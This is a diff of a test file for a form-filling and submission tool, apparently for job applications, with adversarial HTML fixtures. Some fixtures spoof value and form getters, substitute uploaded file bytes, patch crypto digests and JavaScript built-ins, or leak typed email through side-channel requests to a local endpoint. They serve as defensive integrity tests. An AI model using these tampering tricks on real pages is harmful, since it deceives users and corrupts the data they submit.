@@ -42,6 +42,7 @@ import path from 'node:path';
 import test from 'node:test';
 import { spawn } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
+import { WebSocketServer } from 'ws';
 import {
   ATOMIC_SUBMIT_V4_CAPABILITY,
   ATOMIC_SUBMIT_POLICY,
@@ -702,9 +703,12 @@ const FILL_BY_PHONE_FORMAT = `<!doctype html><meta charset="utf-8"><title>Applic
   });
 </script>`;
 
+const FILL_BY_INFERRED_PHONE_FORMAT = FILL_BY_PHONE_FORMAT
+  .replace('type="tel"', 'type="text" inputmode="tel"');
+
 const FILL_BY_SELECT_LABEL = `<!doctype html><meta charset="utf-8"><title>Application select label</title>
 <form id="application_form" novalidate>
-  <div><label for="department">Department</label><select id="department">
+  <div><label for="department">Department</label><select id="department" name="department">
     <option value="">Choose</option><option value="eng" label="Engineering">Engineering department</option>
   </select></div>
   <label for="select-resume">Resume</label><input id="select-resume" name="candidate_resume" type="file">
@@ -721,7 +725,7 @@ const FILL_BY_SELECT_LABEL = `<!doctype html><meta charset="utf-8"><title>Applic
 
 const FILL_BY_SELECT_PUNCTUATION = `<!doctype html><meta charset="utf-8"><title>Application select punctuation</title>
 <form id="application_form" novalidate>
-  <div><label for="experience-band">Experience</label><select id="experience-band">
+  <div><label for="experience-band">Experience</label><select id="experience-band" name="experience_band">
     <option value="">Choose</option><option value="10+">10+</option>
   </select></div>
   <label for="punctuation-resume">Resume</label><input id="punctuation-resume" name="candidate_resume" type="file">
@@ -748,6 +752,9 @@ const FILL_BY_DATE_NORMALIZATION = `<!doctype html><meta charset="utf-8"><title>
   });
 </script>`;
 
+const FILL_BY_INFERRED_DATE_NORMALIZATION = FILL_BY_DATE_NORMALIZATION
+  .replace('type="date"', 'type="text" placeholder="Pick date"');
+
 const WORKABLE_ROLE_SEND = WORKABLE_BARE_SEND
   .replace('<button id="send" type="submit">Send</button>', '<div id="send" role="button" tabindex="0">Send</div>')
   .replace("document.getElementById('application').addEventListener('submit'", "document.getElementById('send').addEventListener('click'");
@@ -762,8 +769,12 @@ const WORKABLE_FORM_ACTION_OVERRIDE = WORKABLE_BARE_SEND
 
 const WORKABLE_EXPLICIT_OVERRIDE = WORKABLE_BARE_SEND
   .replace(
+    '<form id="application" action="/jobs/application" novalidate>',
+    '<form id="application" action="/jobs/application" enctype="multipart/form-data">'
+  )
+  .replace(
     '<button id="send" type="submit">Send</button>',
-    '<button id="send" type="submit" formaction="/jobs/alternate" formmethod="post" formnovalidate>Submit application</button>'
+    '<button id="send" type="submit" formaction="/jobs/alternate" formmethod="post">Submit application</button>'
   );
 
 const WORKABLE_FORM_TARGET = WORKABLE_BARE_SEND
@@ -846,7 +857,7 @@ const WORKABLE_PROOF_LOSS_EXPLICIT_DECOY = `<!doctype html><meta charset="utf-8"
 </script>`;
 
 const activationDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Activation drift</title>
-<form id="application" method="post" action="/record-click?who=activation-native" novalidate>
+<form id="application" method="post" action="/record-click?who=activation-native" enctype="multipart/form-data">
   <label for="first-name">First name</label><input id="first-name" name="first_name">
   <label for="last-name">Last name</label><input id="last-name" name="last_name">
   <label for="email">Email</label><input id="email" name="email" type="email">
@@ -873,7 +884,7 @@ const activationDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><tit
 </script>`;
 
 const PRE_CHOOSER_AUTO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Pre-chooser transport containment</title>
-<form id="application" method="post" action="/record-click?who=prechooser-native" novalidate>
+<form id="application" method="post" action="/record-click?who=prechooser-native" enctype="multipart/form-data" novalidate>
   <label for="first-name">First name</label><input id="first-name" name="first_name">
   <label for="last-name">Last name</label><input id="last-name" name="last_name">
   <label for="email">Email</label><input id="email" name="email" type="email">
@@ -887,12 +898,6 @@ const PRE_CHOOSER_AUTO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Pre
   var prechooserForm = document.getElementById('application');
   document.getElementById('email').addEventListener('input', function () {
     fetch('/record-click?who=prechooser-fill-fetch', { method: 'POST', body: 'field=email' }).catch(function () {});
-    fetch('/record-click?who=prechooser-fill-get&email=' + encodeURIComponent(this.value)).catch(function () {});
-    var image = new Image();
-    image.src = '/record-click?who=prechooser-fill-image&email=' + encodeURIComponent(this.value);
-    try { new EventSource('/record-click?who=prechooser-fill-eventsource&email=' + encodeURIComponent(this.value)); } catch (error) {}
-    try { new WebSocket('ws://' + location.host + '/record-click?who=prechooser-fill-websocket'); } catch (error) {}
-    try { new WebTransport('https://' + location.host + '/record-click?who=prechooser-fill-webtransport'); } catch (error) {}
     prechooserForm.requestSubmit(document.getElementById('send-a'));
   });
   document.getElementById('resume').addEventListener('change', function () {
@@ -906,45 +911,6 @@ const PRE_CHOOSER_AUTO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Pre
   prechooserForm.addEventListener('submit', function (event) {
     event.preventDefault(); record('prechooser-submit-handler');
   });
-</script>`;
-
-const CROSS_FORM_OPTIN_DECOY = `<!doctype html><meta charset="utf-8"><title>Cross form opt-in decoy</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
-  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
-  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
-  <button id="send" type="submit" disabled>Send</button>
-</form>
-<form id="newsletter">
-  <label><input id="newsletter-yes" type="radio" name="sms_opt_in" value="true">Yes</label>
-  <label><input id="newsletter-no" type="radio" name="sms_opt_in" value="false">No</label>
-</form><div id="submitted">cross form opt-in fixture</div>
-<script>${HELPERS}
-  document.getElementById('newsletter-no').addEventListener('change', function () { record('newsletter-decline'); });
-</script>`;
-
-const ACTION_BOUNDARY_DRIFT = `<!doctype html><meta charset="utf-8"><title>Applicant action binding drift</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
-  <label for="boundary-email">Email</label><input id="boundary-email" name="email" type="email">
-  <label for="boundary-resume">Resume</label><input id="boundary-resume" name="resume" type="file">
-  <button id="send" type="submit">Send</button>
-</form><div id="submitted">action boundary fixture</div>
-<button id="arm-boundary" type="button">Arm boundary drift</button>
-<script>
-  var boundaryForm = document.getElementById('application_form');
-  var nativeGetAttribute = boundaryForm.getAttribute;
-  var boundaryArmed = false;
-  var boundaryRead = false;
-  document.getElementById('arm-boundary').addEventListener('click', function () {
-    boundaryArmed = true;
-  });
-  boundaryForm.getAttribute = function (name) {
-    var value = nativeGetAttribute.call(boundaryForm, name);
-    if (name === 'action' && boundaryArmed && !boundaryRead) {
-        boundaryRead = true;
-        queueMicrotask(function () { boundaryForm.setAttribute('action', '/native-decoy'); });
-    }
-    return value;
-  };
 </script>`;
 
 const JOB_ALERT_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Job alerts</title>
@@ -1076,24 +1042,12 @@ const confirmationDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><t
 </script>`;
 
 const OVER_BOUND_SUBMITTED_STATE = `<!doctype html><meta charset="utf-8"><title>Over-bound application state</title>
-<form id="application_form" novalidate>
-  <label for="bound-email">Email *</label><input id="bound-email" type="email" required aria-invalid="true">
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="bound-email">Email *</label><input id="bound-email" name="email" type="email" required>
   <label for="bound-resume">Resume</label><input id="bound-resume" name="candidate_resume" type="file">
-  ${Array.from({ length: 257 }, (_, index) => '<input type="hidden" name="state_' + index + '" value="A">').join('')}
+  ${Array.from({ length: 513 }, (_, index) => '<input type="hidden" name="state_' + index + '" value="A">').join('')}
   <button id="send" type="submit">Send</button>
-</form><button id="arm-bound" type="button">Arm update</button><div id="submitted"></div>
-<script>${HELPERS}
-  var boundArmed = false;
-  document.getElementById('arm-bound').addEventListener('click', function () { boundArmed = true; });
-  document.getElementById('bound-email').addEventListener('input', function () {
-    if (!boundArmed) return;
-    boundArmed = false;
-    document.querySelector('input[name="state_256"]').value = 'B';
-  });
-  document.getElementById('application_form').addEventListener('submit', function (event) {
-    event.preventDefault(); record('over-bound');
-  });
-</script>`;
+</form><div id="submitted"></div>`;
 
 const FORGED_SUCCESS_MARKERS = `<!doctype html><meta charset="utf-8"><title>Forged proof markers</title>
 <form id="application_form" novalidate>
@@ -1199,7 +1153,7 @@ const FORMLESS_STATE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Formle
 
 const EXTERNAL_ASSOCIATED_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>External associated application</title>
 <form id="application_form" action="/jobs/application" novalidate><button id="send" type="submit">Send</button></form>
-<label for="external-email">Email</label><input id="external-email" form="application_form" type="email">
+<label for="external-email">Email</label><input id="external-email" form="application_form" name="email" type="email">
 <label for="external-resume">Resume</label><input id="external-resume" form="application_form" name="candidate_resume" type="file">
 <div id="submitted"></div>
 <script>${HELPERS}
@@ -1209,7 +1163,7 @@ const EXTERNAL_ASSOCIATED_BARE_SEND = `<!doctype html><meta charset="utf-8"><tit
 </script>`;
 
 const PRE_CHOOSER_BASE_DRIFT = `<!doctype html><meta charset="utf-8"><base id="proof-base" href="/initial/"><title>Proof base drift</title>
-<form id="application_form" action="jobs/application" method="post" novalidate>
+<form id="application_form" action="jobs/application" method="post" enctype="multipart/form-data" novalidate>
   <label for="proof-email">Email</label><input id="proof-email" type="email">
   <label for="proof-resume">Resume</label><input id="proof-resume" name="candidate_resume" type="file">
   <button id="send" type="submit">Send</button>
@@ -1344,6 +1298,43 @@ const WHOLE_FORM_FAILED_CHOICE = `<!doctype html><meta charset="utf-8"><title>Wh
   });
 </script>`;
 
+const V3_DETACHED_UNRELATED_FAILED_CHOICE = `<!doctype html><meta charset="utf-8"><title>V3 detached unrelated failed choice</title>
+<form id="application_form" novalidate>
+  <label for="v3-cross-email">Email</label><input id="v3-cross-email" type="email">
+  <label for="v3-cross-resume">Resume</label><input id="v3-cross-resume" name="candidate_resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form>
+<div id="secondary-host"><form id="secondary_form" novalidate>
+  <div id="secondary-question" class="field select__container">
+    <label for="secondary-choice">Secondary preference</label>
+    <div class="select__control"><div id="secondary-value" class="select__single-value" style="display:none"></div>
+      <input id="secondary-choice" role="combobox" aria-haspopup="listbox" aria-controls="secondary-options"></div>
+  </div>
+  <div id="secondary-options" role="listbox" style="display:none">
+    <div id="secondary-wrong" role="option">Yes, definitely</div>
+  </div>
+</form></div>
+<button id="remove-secondary" type="button">Remove secondary form</button><div id="submitted"></div>
+<script>${HELPERS}
+  document.getElementById('secondary-choice').addEventListener('click', function () {
+    document.getElementById('secondary-options').style.display = '';
+    this.setAttribute('aria-expanded', 'true');
+  });
+  document.getElementById('secondary-wrong').addEventListener('click', function () {
+    var value = document.getElementById('secondary-value');
+    value.style.display = '';
+    value.textContent = 'No';
+    document.getElementById('secondary-options').style.display = 'none';
+    document.getElementById('secondary-choice').setAttribute('aria-expanded', 'false');
+  });
+  document.getElementById('remove-secondary').addEventListener('click', function () {
+    document.getElementById('secondary-host').remove();
+  });
+  document.getElementById('application_form').addEventListener('submit', function (event) {
+    event.preventDefault(); record('v3-application');
+  });
+</script>`;
+
 const actionTargetSwapPage = (kind) => {
   const isSelect = kind === 'select';
   const isUpload = kind === 'upload';
@@ -1425,46 +1416,21 @@ const CUSTOM_SUBMIT_CHOICE = `<!doctype html><meta charset="utf-8"><title>Custom
 </script>`;
 
 const lateChooserReparentPage = (explicit) => `<!doctype html><meta charset="utf-8"><title>Late chooser reparent</title>
-<form id="application_form" novalidate>
-  <label for="late-email">Email *</label><input id="late-email" type="email" required aria-invalid="true">
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="late-email">Email *</label><input id="late-email" name="email" type="email" required aria-invalid="true">
   <label for="late-resume">Resume</label><input id="late-resume" name="candidate_resume" type="file">
   ` + (explicit
-    ? '<div id="send" role="button" tabindex="0">Submit application</div>'
+    ? '<button id="send" type="submit">Submit application</button>'
     : '<button id="send" type="submit">Send</button>') + `
 </form>
 <form id="late-decoy"><input name="message" value="decoy"></form><div id="submitted"></div>
 <script>${HELPERS}
-  var nativeArrayBuffer = File.prototype.arrayBuffer;
-  var hashReads = 0;
-  var lateArmed = false;
-  File.prototype.arrayBuffer = function () {
-    hashReads += 1;
-    if (hashReads >= 3) lateArmed = true;
-    return nativeArrayBuffer.call(this);
-  };
   var lateSubmit = document.getElementById('send');
-  var innerTextGetter = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerText').get;
-  Object.defineProperty(lateSubmit, 'innerText', {
-    configurable: true,
-    get: function () {
-      var value = innerTextGetter.call(this);
-      if (lateArmed) {
-        lateArmed = false;
-        this.setAttribute('data-late-reparent', '1');
-      }
-      return value;
-    }
+  var lateEmailInputs = 0;
+  document.getElementById('late-email').addEventListener('input', function () {
+    lateEmailInputs += 1;
+    if (lateEmailInputs === 3) document.getElementById('late-decoy').append(lateSubmit);
   });
-  new MutationObserver(function () {
-    if (lateSubmit.hasAttribute('data-late-reparent')) document.getElementById('late-decoy').append(lateSubmit);
-  }).observe(lateSubmit, { attributes: true, attributeFilter: ['data-late-reparent'] });
-  document.getElementById('application_form').addEventListener('submit', function (event) {
-    event.preventDefault(); record('late-original');
-  });
-  document.getElementById('late-decoy').addEventListener('submit', function (event) {
-    event.preventDefault(); record('late-decoy');
-  });
-  ` + (explicit ? "lateSubmit.addEventListener('click', function () { record('late-explicit'); });" : '') + `
 </script>`;
 
 const REACTIVATED_UNRELATED_FORM = `<!doctype html><meta charset="utf-8"><title>Application reactivated unrelated form</title>
@@ -1533,6 +1499,17 @@ const WORKABLE_WITH_UNRELATED_FORM = WORKABLE_BARE_SEND.replace(
     + '<input id="newsletter-email" type="email"><button type="button">Subscribe</button></form>'
     + '<form id="application"'
 );
+
+const EXPLICIT_SUBMIT_WITH_ONLY_UNRELATED_PROOF = `<!doctype html><meta charset="utf-8"><title>Application with unrelated proof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="application-email">Application email</label>
+  <input id="application-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form>
+<form id="unrelated_form" action="/native-decoy" method="post">
+  <label for="unrelated-email">Unrelated email</label>
+  <input id="unrelated-email" name="email" type="email">
+</form><div id="submitted">unrelated proof fixture</div>`;
 
 const TEXT_REPURPOSE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application text repurpose</title>
 <form id="application_form" novalidate>
@@ -1616,7 +1593,7 @@ const URL_HOP_WRONG = `<!doctype html><meta charset="utf-8"><title>Wrong workflo
 </script>`;
 
 const INITIAL_REDIRECT_TARGET = `<!doctype html><meta charset="utf-8"><title>Redirected application</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
   <label for="redirect-email">Email</label><input id="redirect-email" name="email" type="email">
   <label for="redirect-resume">Resume</label><input id="redirect-resume" name="resume" type="file">
   <button id="send" type="submit">Send</button>
@@ -1627,9 +1604,13 @@ const INITIAL_REDIRECT_TARGET = `<!doctype html><meta charset="utf-8"><title>Red
 </script>`;
 
 const nativeActivationPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native activation ${mode}</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
   <label for="native-email">Email</label><input id="native-email" name="email" type="email">
   <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  ${mode === 'submit-aria-required' || mode === 'submit-star-marker' || mode === 'pre-arm-required'
+    ? '<label id="late-required-label" for="pre-arm-required">Late custom field</label>'
+      + '<input id="pre-arm-required" name="late_required">'
+    : ''}
   <button id="send" type="submit">Send</button>
 </form>
 <form id="decoy_form" action="/native-decoy" method="post"></form>
@@ -1655,6 +1636,22 @@ const nativeActivationPage = (mode) => `<!doctype html><meta charset="utf-8"><ti
       submitControl.setAttribute('form', 'decoy_form');
     });
   }
+  if (activationMode === 'submit-aria-required') {
+    applicationForm.addEventListener('submit', function () {
+      document.getElementById('pre-arm-required').setAttribute('aria-required', 'true');
+    });
+  }
+  if (activationMode === 'submit-star-marker') {
+    applicationForm.addEventListener('submit', function () {
+      document.getElementById('late-required-label').textContent = 'Late custom field *';
+    });
+  }
+  if (activationMode === 'submit-cancel-direct-real') {
+    applicationForm.addEventListener('submit', function (event) {
+      event.preventDefault();
+      cachedNativeSubmit.call(applicationForm);
+    });
+  }
   if (activationMode === 'cached-direct-real' || activationMode === 'cached-direct-decoy') {
     submitControl.addEventListener('click', function (event) {
       event.preventDefault();
@@ -1675,45 +1672,10 @@ const nativeActivationPage = (mode) => `<!doctype html><meta charset="utf-8"><ti
       cachedNativeSubmit.call(applicationForm);
     });
   }
-  if (activationMode === 'side-channels') {
-    submitControl.addEventListener('click', function () {
-      fetch('/record-click?who=activation-get&email=' + encodeURIComponent(document.getElementById('native-email').value))
-        .catch(function () {});
-      var image = new Image();
-      image.src = '/record-click?who=activation-image';
-      navigator.sendBeacon('/record-click?who=activation-ping', 'applicant=1');
-      try { new EventSource('/record-click?who=activation-eventsource'); } catch (error) {}
-      try { new WebSocket('ws://' + location.host + '/record-click?who=activation-websocket'); } catch (error) {}
-      try { new WebTransport('https://' + location.host + '/record-click?who=activation-webtransport'); } catch (error) {}
-    });
-  }
-</script>`;
-
-const lateFinalChooserDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Late chooser drift ${mode}</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
-  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
-  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
-  <input id="late-job-id" name="job_id" type="hidden" value="A">
-  <button id="send" type="submit">Send</button>
-</form><div id="submitted">late chooser fixture</div>
-<script>
-  var lateMode = ${JSON.stringify(mode)};
-  var lateSend = document.getElementById('send');
-  var originalRect = lateSend.getBoundingClientRect.bind(lateSend);
-  var rectReads = 0;
-  lateSend.getBoundingClientRect = function () {
-    rectReads += 1;
-    if (rectReads === 2) {
-      if (lateMode === 'action') document.getElementById('application_form').action = '/native-decoy';
-      if (lateMode === 'hidden') document.getElementById('late-job-id').value = 'B';
-      if (lateMode === 'text') lateSend.textContent = 'Submit application';
-    }
-    return originalRect();
-  };
 </script>`;
 
 const WORKABLE_NATIVE_ALLOWLIST = `<!doctype html><meta charset="utf-8"><title>Native Workable application</title>
-<form id="application" action="/native-real" method="post" novalidate>
+<form id="application" action="/native-real" method="post" enctype="multipart/form-data">
   <label for="workable-firstname">First name</label>
   <input id="workable-firstname" name="firstname">
   <label for="workable-email">Email</label>
@@ -1722,6 +1684,12 @@ const WORKABLE_NATIVE_ALLOWLIST = `<!doctype html><meta charset="utf-8"><title>N
   <input id="workable-avatar" name="avatar" type="file">
   <label for="workable-resume">Resume</label>
   <input id="workable-resume" name="resume" type="file" data-ui="resume">
+  <span id="workable-experience-label">* Which development experience applies?</span>
+  <div role="group" aria-labelledby="workable-experience-label">
+    <label><input type="checkbox" name="5854742" value="internship" aria-required="true">Internship</label>
+    <label><input type="checkbox" name="5854743" value="hackathon" aria-required="true" checked>Hackathon</label>
+    <label><input type="checkbox" name="5854744" value="individual" aria-required="true">Individual Development</label>
+  </div>
   <button id="send" type="submit">Send</button>
 </form>
 <form id="avatar-decoy">
@@ -1729,8 +1697,13 @@ const WORKABLE_NATIVE_ALLOWLIST = `<!doctype html><meta charset="utf-8"><title>N
 </form>
 <div id="submitted">native Workable fixture</div>`;
 
+const WORKABLE_NATIVE_ALLOWLIST_EMPTY = WORKABLE_NATIVE_ALLOWLIST.replace(
+  'name="5854743" value="hackathon" aria-required="true" checked',
+  'name="5854743" value="hackathon" aria-required="true"'
+);
+
 const NATIVE_SERIALIZER = `<!doctype html><meta charset="utf-8"><title>Native application serializer</title>
-<form id="application_form" action="/native-real" method="post" enctype="application/x-www-form-urlencoded" novalidate>
+<form id="application_form" action="/native-real" method="post" enctype="application/x-www-form-urlencoded">
   <label for="serializer-email">Email</label>
   <input id="serializer-email" name="email" type="email">
   <fieldset name="fieldset_must_not_serialize">
@@ -1744,15 +1717,1320 @@ const NATIVE_SERIALIZER = `<!doctype html><meta charset="utf-8"><title>Native ap
   <button id="send" name="decision" value="apply" type="submit">Send</button>
 </form><div id="submitted">serializer fixture</div>`;
 
+const NATIVE_MULTIPART_SERIALIZER = `<!doctype html><meta charset="utf-8"><title>Native multipart application serializer</title>
+<form id="application_form" action="/native-multipart-real" method="post" enctype="multipart/form-data">
+  <label for="multipart-email">Email</label>
+  <input id="multipart-email" name="email" type="email">
+  <input name="role" type="hidden" value="engineering">
+  <input name="role" type="hidden" value="security">
+  <label for="multipart-resume">Resume</label>
+  <input id="multipart-resume" name="resume" type="file">
+  <button id="send" name="decision" value="apply" type="submit">Submit application</button>
+</form><div id="submitted">multipart serializer fixture</div>`;
+
+const NATIVE_FILE_BYTE_SUBSTITUTION = `<!doctype html><meta charset="utf-8"><title>Native file integrity application</title>
+<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="integrity-email">Email</label><input id="integrity-email" name="email" type="email">
+  <label for="integrity-resume">Resume</label><input id="integrity-resume" name="resume" type="file">
+  <button id="mutate" type="button">Review attachment</button>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">file integrity fixture</div>
+<script>
+  document.getElementById('mutate').addEventListener('click', function () {
+    var input = document.getElementById('integrity-resume');
+    var original = input.files && input.files[0];
+    if (!original) return;
+    File.prototype.arrayBuffer = async function () {
+      return new TextEncoder().encode('resume').buffer;
+    };
+    if (globalThis.SubtleCrypto) {
+      SubtleCrypto.prototype.digest = async function () { return new Uint8Array(32).buffer; };
+    }
+    var transfer = new DataTransfer();
+    transfer.items.add(new File(['attack'], original.name, {
+      type: original.type,
+      lastModified: original.lastModified
+    }));
+    input.files = transfer.files;
+  });
+</script>`;
+
+const NATIVE_TEXT_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native text value spoof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="spoof-email">Email</label><input id="spoof-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">text spoof fixture</div>
+<script>
+  var email = document.getElementById('spoof-email');
+  var nativeValueSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
+  email.addEventListener('input', function () {
+    nativeValueSetter.call(email, 'attacker@example.com');
+    Object.defineProperty(email, 'value', {
+      configurable: true,
+      get: function () { return 'applicant@example.com'; }
+    });
+  }, { once: true });
+</script>`;
+
+const NATIVE_SELECT_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native select value spoof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="spoof-role">Role</label><select id="spoof-role" name="role">
+    <option value="">Choose</option><option value="eng">Engineering</option>
+  </select>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">select spoof fixture</div>
+<script>
+  var role = document.getElementById('spoof-role');
+  var nativeOptionValueSetter = Object.getOwnPropertyDescriptor(HTMLOptionElement.prototype, 'value').set;
+  role.addEventListener('change', function () {
+    nativeOptionValueSetter.call(role.options[1], 'attacker');
+    Object.defineProperty(role, 'value', {
+      configurable: true,
+      get: function () { return 'eng'; }
+    });
+  }, { once: true });
+</script>`;
+
+const NATIVE_TEXTAREA_WHITESPACE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native textarea whitespace drift</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="textarea-answer">Why this role?</label>
+  <textarea id="textarea-answer" name="answer"></textarea>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">textarea whitespace fixture</div><div id="attempted">not attempted</div>
+<script>
+  var answer = document.getElementById('textarea-answer');
+  var nativeTextareaValueGetter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').get;
+  var nativeTextareaValueSetter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set;
+  answer.addEventListener('input', function () {
+    if (nativeTextareaValueGetter.call(answer) !== 'Line one\\nLine two') return;
+    nativeTextareaValueSetter.call(answer, 'Line one Line two');
+    document.getElementById('attempted').textContent = 'collapsed';
+  });
+</script>`;
+
+const NATIVE_HIDDEN_CHOICE_LABEL_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native hidden choice label spoof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <fieldset>
+    <legend>Work authorization</legend>
+    <input id="authorization-yes" name="authorization" type="radio" value="attacker">
+    <label for="authorization-yes"><span hidden>Yes</span></label>
+  </fieldset>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">hidden choice label fixture</div><div id="attempted">not attempted</div>
+<script>
+  var authorization = document.getElementById('authorization-yes');
+  Object.defineProperty(authorization, 'value', {
+    configurable: true,
+    get: function () { return 'Yes'; }
+  });
+  authorization.addEventListener('change', function () {
+    document.getElementById('attempted').textContent = 'checked';
+  });
+</script>`;
+
+const NATIVE_LEGACY_VERIFIER_WRITE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native legacy verifier write drift</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="legacy-email">Email</label><input id="legacy-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">legacy verifier fixture</div><div id="attempted">not attempted</div>
+<script>
+  var legacyEmail = document.getElementById('legacy-email');
+  var nativeInputValueSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
+  legacyEmail.addEventListener('input', function () {
+    nativeInputValueSetter.call(legacyEmail, 'attacker@example.com');
+    document.getElementById('attempted').textContent = 'rewritten';
+  });
+</script>`;
+
+const NATIVE_MAIN_WORLD_PRIMORDIAL_PATCHES = `<!doctype html><meta charset="utf-8"><title>Native main-world primordial patches</title>
+<script>
+  var nativeObjectKeys = Object.keys;
+  var nativeObjectIs = Object.is;
+  var nativeArraySlice = Array.prototype.slice;
+  var nativeEval = window.eval;
+  var nativeReflectApply = Reflect.apply;
+  globalThis.__primordialCapabilityLeak = 'no';
+  function markLeak() {
+    globalThis.__primordialCapabilityLeak = 'yes';
+    var output = document.getElementById('capability-leaked');
+    if (output) output.textContent = 'yes';
+    var state = document.getElementById('capability-state');
+    if (state) state.value = 'yes';
+  }
+  function inspect(value) {
+    try {
+      if (typeof value === 'string' && /^[0-9a-f]{48}$/.test(value)) {
+        markLeak();
+      }
+      if (value && typeof value === 'object'
+        && (typeof value.nativePostBindingJson === 'function'
+          || typeof value.finalizeActivationJson === 'function')) {
+        markLeak();
+      }
+    } catch {}
+  }
+  Object.keys = function (value) { inspect(value); return nativeObjectKeys(value); };
+  Object.is = function (left, right) { inspect(left); inspect(right); return nativeObjectIs(left, right); };
+  Array.prototype.slice = function () {
+    for (var index = 0; index < this.length; index += 1) inspect(this[index]);
+    return nativeReflectApply(nativeArraySlice, this, arguments);
+  };
+  window.eval = function (source) {
+    if (String(source).includes('__litosV4SubmissionContainment')) {
+      markLeak();
+    }
+    return nativeReflectApply(nativeEval, window, [source]);
+  };
+  Reflect.apply = function (target, receiver, args) {
+    inspect(receiver);
+    if (args) for (var index = 0; index < args.length; index += 1) inspect(args[index]);
+    return nativeReflectApply(target, receiver, args);
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="primordial-email">Email</label><input id="primordial-email" name="email" type="email">
+  <input id="capability-state" name="capability_state" type="hidden" value="no">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">primordial patch fixture</div>
+<div id="capability-leaked"></div>
+<script>document.getElementById('capability-leaked').textContent = globalThis.__primordialCapabilityLeak;</script>`;
+
+const NATIVE_NAMELESS_PROOF_CONTROLS = `<!doctype html><meta charset="utf-8"><title>Native nameless proof controls</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="nameless-first">First name</label><input id="nameless-first">
+  <label for="nameless-last">Last name</label><input id="nameless-last">
+  <button id="send" type="submit">Send</button>
+</form><div id="submitted">nameless proof fixture</div>`;
+
+const NATIVE_MULTI_SELECT_INJECTION = `<!doctype html><meta charset="utf-8"><title>Native multi-select injection</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="multi-role">Role</label><select id="multi-role" name="role" multiple>
+    <option value="eng">Engineering</option>
+    <option value="attacker">Attacker-selected role</option>
+  </select>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">multi-select injection fixture</div>
+<script>
+  document.getElementById('multi-role').addEventListener('change', function (event) {
+    event.currentTarget.options[1].selected = true;
+  });
+</script>`;
+
+const NATIVE_FORM_OWNER_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native form owner spoof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <button id="send" type="submit">Submit application</button>
+</form>
+<form id="decoy" action="/native-decoy" method="post"></form>
+<label for="spoof-owner-email">Email</label>
+<input id="spoof-owner-email" class="spoof-owner" form="decoy" name="email" type="email">
+<label for="spoof-owner-resume">Resume</label>
+<input id="spoof-owner-resume" class="spoof-owner" form="decoy" name="resume" type="file">
+<div id="submitted">form owner spoof fixture</div>
+<script>
+  var nativeFormGetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'form').get;
+  Object.defineProperty(HTMLInputElement.prototype, 'form', {
+    configurable: true,
+    get: function () {
+      return this.classList.contains('spoof-owner')
+        ? document.getElementById('application_form')
+        : nativeFormGetter.call(this);
+    }
+  });
+</script>`;
+
+const NATIVE_FORGED_SUBMIT_LABEL = `<!doctype html><meta charset="utf-8"><title>Native forged submit label</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
